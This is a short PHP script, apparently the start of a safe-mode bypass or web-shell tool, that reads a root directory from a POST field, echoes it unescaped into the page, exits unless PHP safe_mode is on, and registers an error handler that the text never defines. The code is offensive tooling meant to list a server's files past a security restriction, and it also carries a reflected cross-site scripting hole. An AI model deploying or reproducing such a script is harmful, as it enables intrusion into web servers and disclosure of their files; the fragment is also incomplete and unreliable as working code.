<?php
error_reporting(E_WARNING); 
ini_set("display_errors", 1); 

echo "<head><title>".getcwd()."</title></head>"; 

echo "<form method=POST>"; 
echo "<div style='float: left'>Root directory: <input type=text name=root value='{$_POST['root']}'></div>"; 
echo "<input type=submit value='--&raquo;'></form>"; 

echo "<HR>"; 

// break fucking safe-mode ! 

$root = "/"; 

if($_POST['root']) 
	$root = $_POST['root']; 

if (!ini_get('safe_mode')) 
	die("Safe-mode is OFF."); 

$c = 0; 
$D = array(); 
set_error_handler("eh"); 
  
?>